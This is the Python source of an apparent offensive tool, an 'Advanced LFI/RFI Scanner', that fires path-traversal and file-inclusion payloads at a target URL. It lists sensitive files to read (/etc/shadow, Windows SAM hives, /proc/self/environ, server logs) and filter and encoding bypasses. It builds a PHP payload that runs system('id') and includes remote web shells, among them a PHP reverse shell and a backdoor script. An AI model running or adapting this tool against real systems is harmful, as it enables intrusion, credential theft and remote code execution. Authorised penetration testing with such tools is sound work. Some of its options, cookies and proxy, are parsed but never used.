import requests
import argparse
import os
import json
import re
import hashlib
import random
import string
from urllib.parse import quote, unquote, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress only the specific warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
]

# Regex patterns for positive detection
LFI_PATTERNS = [
    r"root:.*:.*:.*",            # /etc/passwd
    r"boot\.ini",                 # boot.ini
    r"\[fonts\]",                 # Windows files
    r"<\?php",                    # PHP code
    r"<!DOCTYPE\s+html",          # HTML content
    r"HTTP/[0-9.]+ 200",          # HTTP headers
    r"uid=[0-9]+\([a-z0-9_]+\)",  # id command output
    r"Directory of ",             # Windows dir output
    r"Volume in drive [A-Z]",     # Windows dir output
    r"lp:x:[0-9]+:[0-9]+",        # Linux passwd file
    r"\$group\s+\=\s+",           # PHP variables
    r"PATH\=",                    # Environment variables
    r"HTTP_USER_AGENT",           # HTTP headers
    r"Content-Type: text/html",   # HTTP headers
    r"noexec,nosuid,nodev",       # mount options
    r"Build Date:",               # PHP info output
    r"OSName:",                   # PHP info
    r"allow_url_fopen",           # PHP settings
]

RFI_PATTERNS = [
    r"hacked",                    # Common text
    r"pwned",                     # Common text
    r"shell",                     # Common text
    r"uname -a",                  # Command output
    r"eval\(\)",                  # Eval usage
    r"system\(\)",                # System usage
    r"base64_decode",             # Common encoder
    r"file_get_contents",         # PHP function
    r"exec\(\)",                  # PHP function
    r"passthru\(\)",              # PHP function
    r"shell_exec\(\)",            # PHP function
    r"phpinfo\(\)",               # PHP info
    r"whoami",                    # Command
    r"__halt_compiler",           # PHP function
    r"<\?php.*\?>",               # PHP code
]

# Common files to check for LFI
COMMON_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/etc/apache2/apache2.conf",
    "/etc/httpd/conf/httpd.conf",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/var/log/apache/access.log",
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "/var/log/nginx/access.log",
    "/var/log/apache/error.log",
    "/var/log/apache2/error.log",
    "/var/log/httpd/error_log",
    "/var/log/nginx/error.log",
    "/var/www/html/index.php",
    "/var/www/index.php",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/Windows/win.ini",
    "C:/boot.ini",
    "C:/Windows/repair/sam",
    "C:/Windows/repair/system",
    "C:/Windows/repair/software",
    "C:/Windows/repair/security",
    "../../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini"
]

# LFI Bypass techniques
LFI_BYPASSES = [
    # Basic path traversal
    "../",
    "..../",  # Some servers normalize double dots
    "....//",
    "%2e%2e%2f",  # URL encoded
    "%252e%252e%252f",  # Double URL encoded
    "%c0%ae%c0%ae%c0%af",  # Overlong UTF-8 encoding
    "....//....//....//",
    
    # Null byte (works in PHP < 5.3.4)
    "%00",
    "\0",
    "\x00",
    
    # Filter bypasses
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=convert.base64-encode/resource=",
    "php://filter/convert.iconv.utf-8.utf-16/resource=",
    "php://filter/convert.iconv.utf-8.utf-16le/resource=",
    "php://filter/convert.iconv.utf-8.utf-16be/resource=",
    "php://filter/zlib.deflate/convert.base64-encode/resource=",
    
    # PHP wrappers
    "php://input",
    "data://text/plain;base64,",
    "expect://",
    "zip://",
    "phar://",
    "glob://",
    "compress.zlib://",
    "compress.bzip2://",
    "file://",
    
    # Path truncation (old PHP versions)
    "././././././././././././././././././././././././././././././././.",
    
    # Alternate encodings
    "..%c0%af",
    "..%c1%9c",
]

# RFI Bypass techniques
RFI_BYPASSES = [
    # Basic remote inclusion
    "http://",
    "https://",
    "ftp://",
    "ftps://",
    
    # URL encoding
    "http%3A%2F%2F",
    "https%3A%2F%2F",
    
    # PHP wrappers
    "php://input",
    "data://text/plain;base64,",
    "expect://",
    "zip://",
    "phar://",
    
    # Nullbyte
    "%00",
    
    # Using localhost
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://localhost:80/",
    
    # Double encoding
    "%2568%2574%2574%2570%253A%252F%252F",
    
    # Non-standard protocols
    "jar:http://",
    "jar:https://",
    "netdoc://"
]

# Web shells to check for RFI
WEBSHELL_URLS = [
    "https://pastebin.com/raw/sH1WQ4h2",
    "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php",
    "https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/simple-backdoor.php"
]

def generate_random_string(length=10):
    """Generate a random string for unique identification"""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def get_random_user_agent():
    """Return a random user agent string"""
    return random.choice(USER_AGENTS)

def load_payloads(file_path):
    """Load payloads from a file, create if not exists"""
    if not os.path.exists(file_path):
        print(f"[!] Payload file not found. Creating: {file_path}")
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'w') as f:
            f.write("/default/payload\n")
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def encode_payloads(payloads, encoding_type="url"):
    """Encode payloads with specified encoding"""
    if encoding_type == "url":
        return [quote(payload) for payload in payloads]
    elif encoding_type == "double":
        return [quote(quote(payload)) for payload in payloads]
    elif encoding_type == "hex":
        return [''.join(f"%{hex(ord(c))[2:]}" for c in payload) for payload in payloads]
    return payloads

def generate_lfi_payloads(base_files, bypasses):
    """Generate LFI payloads from base files and bypass techniques"""
    payloads = []
    
    for bypass in bypasses:
        for file in base_files:
            # Apply bypass technique to the file path
            if "resource=" in bypass:
                payloads.append(f"{bypass}{file}")
            elif "://" in bypass and "data://" not in bypass and "php://" not in bypass:
                continue  # Skip specific protocols for LFI
            else:
                payloads.append(f"{bypass}{file}")
                
                # Also try with an extra slash
                if bypass.endswith("/"):
                    payloads.append(f"{bypass}/{file}")
    
    # Add some non-combined payloads
    payloads.extend(base_files)
    payloads.extend(bypasses)
    
    return list(set(payloads))  # Remove duplicates

def generate_rfi_payloads(webshell_urls, bypasses):
    """Generate RFI payloads from webshell URLs and bypass techniques"""
    payloads = []
    
    # Generate our own detection shell with random marker
    random_marker = generate_random_string(20)
    php_shell = f"<?php echo '{random_marker}'; system('id'); echo '{random_marker}'; ?>"
    base64_shell = f"data://text/plain;base64,{base64.b64encode(php_shell.encode()).decode()}"
    
    for bypass in bypasses:
        for url in webshell_urls:
            if "://" in bypass:
                if "data://" in bypass or "php://" in bypass:
                    payloads.append(f"{bypass}{php_shell}")
                else:
                    payloads.append(f"{bypass}{url}")
            else:
                payloads.append(f"{bypass}{url}")
    
    # Add some basic wrappers directly
    payloads.append(base64_shell)
    
    return list(set(payloads))  # Remove duplicates

def build_request_args(url, method="GET", data=None, headers=None, timeout=10, 
                      allow_redirects=True, verify=False, cookies=None, proxies=None):
    """Build request arguments dictionary"""
    if headers is None:
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        }
    
    args = {
        "url": url,
        "method": method,
        "headers": headers,
        "timeout": timeout,
        "allow_redirects": allow_redirects,
        "verify": verify
    }
    
    if data:
        args["data"] = data
    if cookies:
        args["cookies"] = cookies
    if proxies:
        args["proxies"] = proxies
        
    return args

def make_request(args):
    """Make HTTP request using request arguments"""
    try:
        response = requests.request(**args)
        return response
    except Exception as e:
        print(f"[!] Error making request to {args['url']}: {str(e)}")
        return None

def compare_responses(base_response, test_response):
    """Compare base response with test response to detect anomalies"""
    if not base_response or not test_response:
        return False
    
    # Different status codes may indicate successful injection
    if base_response.status_code != test_response.status_code:
        return True
    
    # Significant content length difference may indicate successful injection
    base_len = len(base_response.content)
    test_len = len(test_response.content)
    
    if base_len > 0 and test_len > 0:
        diff_ratio = abs(base_len - test_len) / max(base_len, test_len)
        if diff_ratio > 0.5:  # More than 50% size difference
            return True
    
    return False

def get_initial_response(url, method="GET", data=None, headers=None):
    """Get initial response for baseline comparison"""
    args = build_request_args(url, method, data, headers)
    return make_request(args)

def scan_lfi(url, payload, base_response=None, random_marker=None, method="GET", data=None, headers=None):
    """Scan for LFI vulnerabilities"""
    if '?' in url and '=' in url:
        # For GET parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        base_url = url.split('?')[0]
        
        results = []
        for param in params:
            # Replace the parameter with our payload
            new_params = params.copy()
            new_params[param] = [payload]
            query_string = '&'.join(f"{p}={v[0]}" for p, v in new_params.items())
            full_url = f"{base_url}?{query_string}"
            
            # Make the request
            args = build_request_args(full_url, method, data, headers)
            response = make_request(args)
            
            if response and response.status_code == 200:
                # Check for indicators of successful LFI
                if check_lfi_success(response.text):
                    print(f"[+] LFI Found: {full_url}")
                    return {"url": full_url, "payload": payload, "param": param}
            
    # Direct path inclusion
    full_url = url + payload
    args = build_request_args(full_url, method, data, headers)
    response = make_request(args)
    
    if response and response.status_code == 200:
        # Check for indicators of successful LFI
        if check_lfi_success(response.text):
            print(f"[+] LFI Found: {full_url}")
            return {"url": full_url, "payload": payload}
    
    return None

def check_lfi_success(content):
    """Check if the response indicates successful LFI"""
    if not content:
        return False
        
    # Check for common patterns indicating successful LFI
    for pattern in LFI_PATTERNS:
        if re.search(pattern, content, re.IGNORECASE):
            return True
    
    return False

def check_rfi_success(content, random_marker=None):
    """Check if the response indicates successful RFI"""
    if not content:
        return False
    
    # If we have a random marker, check for it
    if random_marker and random_marker in content:
        return True
        
    # Check for common patterns indicating successful RFI
    for pattern in RFI_PATTERNS:
        if re.search(pattern, content, re.IGNORECASE):
            return True
    
    return False

def scan_rfi(url, payload, base_response=None, random_marker=None, method="GET", data=None, headers=None):
    """Scan for RFI vulnerabilities"""
    if '?' in url and '=' in url:
        # For GET parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        base_url = url.split('?')[0]
        
        results = []
        for param in params:
            # Replace the parameter with our payload
            new_params = params.copy()
            new_params[param] = [payload]
            query_string = '&'.join(f"{p}={v[0]}" for p, v in new_params.items())
            full_url = f"{base_url}?{query_string}"
            
            # Make the request
            args = build_request_args(full_url, method, data, headers)
            response = make_request(args)
            
            if response and response.status_code == 200:
                # Check for indicators of successful RFI
                if check_rfi_success(response.text, random_marker):
                    print(f"[+] RFI Found: {full_url}")
                    return {"url": full_url, "payload": payload, "param": param}
            
    # Direct path inclusion
    full_url = url + payload
    args = build_request_args(full_url, method, data, headers)
    response = make_request(args)
    
    if response and response.status_code == 200:
        # Check for indicators of successful RFI
        if check_rfi_success(response.text, random_marker):
            print(f"[+] RFI Found: {full_url}")
            return {"url": full_url, "payload": payload}
    
    return None

def threaded_scan(scan_func, url, payloads, base_response=None, random_marker=None, 
                 threads=10, method="GET", data=None, headers=None):
    """Perform scanning using multiple threads"""
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for payload in payloads:
            futures.append(executor.submit(
                scan_func, url, payload, base_response, random_marker, method, data, headers
            ))
        
        for future in futures:
            result = future.result()
            if result:
                results.append(result)
    
    return results

def create_payload_file(filename, payloads):
    """Create a payload file with the specified payloads"""
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, 'w') as f:
        for payload in payloads:
            f.write(f"{payload}\n")
    print(f"[+] Created payload file: {filename}")

def save_results(results, filename):
    """Save scan results to a JSON file"""
    os.makedirs("results", exist_ok=True)
    with open(os.path.join("results", filename), 'w') as f:
        json.dump(results, f, indent=4)
    print(f"[+] Results saved to results/{filename}")

def banner():
    """Print tool banner"""
    print("""
    ╔════════════════════════════════════════════════════╗
    ║               ADVANCED LFI/RFI SCANNER              ║
    ║              ------------------------              ║
    ║        File Inclusion Vulnerability Scanner        ║
    ║        With Bypass Techniques and Automation       ║
    ╚════════════════════════════════════════════════════╝
    """)

def main():
    """Main function"""
    banner()
    
    parser = argparse.ArgumentParser(description="Advanced LFI & RFI Scanner with Bypass Techniques")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. http://target.com/index.php?page=)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method to use")
    parser.add_argument("-d", "--data", help="POST data to send with the request")
    parser.add_argument("-c", "--cookies", help="Cookies to include with the request")
    parser.add_argument("-H", "--header", action="append", help="Custom headers to include with the request")
    parser.add_argument("-p", "--proxy", help="Proxy to use (e.g. http://127.0.0.1:8080)")
    
    # Scan types
    parser.add_argument("--lfi", action="store_true", help="Scan for Local File Inclusion")
    parser.add_argument("--rfi", action="store_true", help="Scan for Remote File Inclusion")
    parser.add_argument("--auto", action="store_true", help="Automatically detect and scan for both LFI and RFI")
    
    # Payloads
    parser.add_argument("--lfi-payloads", default="payloads/lfi.txt", help="Path to LFI payload file")
    parser.add_argument("--rfi-payloads", default="payloads/rfi.txt", help="Path to RFI payload file")
    parser.add_argument("--generate-payloads", action="store_true", help="Generate and save advanced payload files")
    
    # Bypass techniques
    parser.add_argument("--encode", default="none", choices=["none", "url", "double", "hex"], 
                      help="Encoding technique for payloads")
    parser.add_argument("--null-byte", action="store_true", help="Append null byte to payloads")
    parser.add_argument("--filter-bypass", action="store_true", 
                      help="Use PHP filter bypass techniques for LFI")
    
    # Scanning options
    parser.add_argument("--threads", type=int, default=10, help="Number of threads for scanning")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("--follow-redirects", action="store_true", help="Follow HTTP redirects")
    parser.add_argument("--verify-ssl", action="store_true", help="Verify SSL certificates")
    
    # Output options
    parser.add_argument("--output", default=None, help="Output file name prefix")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()

    # Process headers
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Process cookies
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Process proxy
    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    # Ensure at least one scan type is selected
    if not args.lfi and not args.rfi and not args.auto:
        args.auto = True
        print("[*] No scan type specified. Defaulting to automatic scanning.")
    
    # Generate random marker for RFI detection
    random_marker = generate_random_string(20)
    
    # Get base response for comparison
    base_response = get_initial_response(
        args.url, args.method, args.data, headers
    )
    
    # Generate and save payloads if requested
    if args.generate_payloads:
        lfi_payloads = generate_lfi_payloads(COMMON_FILES, LFI_BYPASSES)
        rfi_payloads = generate_rfi_payloads(WEBSHELL_URLS, RFI_BYPASSES)
        
        create_payload_file(args.lfi_payloads, lfi_payloads)
        create_payload_file(args.rfi_payloads, rfi_payloads)
    
    # Load payloads
    lfi_payloads = []
    rfi_payloads = []
    
    if args.lfi or args.auto:
        lfi_payloads = load_payloads(args.lfi_payloads)
        
        # Apply encoding if specified
        if args.encode != "none":
            lfi_payloads = encode_payloads(lfi_payloads, args.encode)
            
        # Append null byte if requested
        if args.null_byte:
            lfi_payloads = [p + "%00" for p in lfi_payloads]
        
        # Add filter bypass techniques if requested
        if args.filter_bypass:
            filter_bypasses = [
                "php://filter/convert.base64-encode/resource=",
                "php://filter/read=convert.base64-encode/resource=",
                "php://filter/convert.iconv.utf-8.utf-16/resource=",
                "php://filter/zlib.deflate/convert.base64-encode/resource="
            ]
            additional_payloads = []
            for bypass in filter_bypasses:
                for payload in lfi_payloads:
                    if not payload.startswith("php://"):
                        additional_payloads.append(f"{bypass}{payload}")
            lfi_payloads.extend(additional_payloads)
    
    if args.rfi or args.auto:
        rfi_payloads = load_payloads(args.rfi_payloads)
        
        # Apply encoding if specified
        if args.encode != "none":
            rfi_payloads = encode_payloads(rfi_payloads, args.encode)
            
        # Append null byte if requested
        if args.null_byte:
            rfi_payloads = [p + "%00" for p in rfi_payloads]
    
    # Run scans
    lfi_results = []
    rfi_results = []
    
    if args.lfi or args.auto:
        print(f"[*] Scanning for LFI with {len(lfi_payloads)} payloads...")
        lfi_results = threaded_scan(
            scan_lfi, args.url, lfi_payloads, base_response, random_marker,
            args.threads, args.method, args.data, headers
        )
        
        if lfi_results:
            print(f"[+] Found {len(lfi_results)} LFI vulnerabilities!")
            output_file = f"{args.output}_lfi.json" if args.output else "lfi_results.json"
            save_results(lfi_results, output_file)
        else:
            print("[-] No LFI vulnerabilities found.")
    
    if args.rfi or args.auto:
        print(f"[*] Scanning for RFI with {len(rfi_payloads)} payloads...")
        rfi_results = threaded_scan(
            scan_rfi, args.url, rfi_payloads, base_response, random_marker,
            args.threads, args.method, args.data, headers
        )
        
        if rfi_results:
            print(f"[+] Found {len(rfi_results)} RFI vulnerabilities!")
            output_file = f"{args.output}_rfi.json" if args.output else "rfi_results.json"
            save_results(rfi_results, output_file)
        else:
            print("[-] No RFI vulnerabilities found.")
    
    print("[+] Scan Completed.")

if __name__ == "__main__":
    import base64  # Import here to avoid issues with use in payloads
    main()
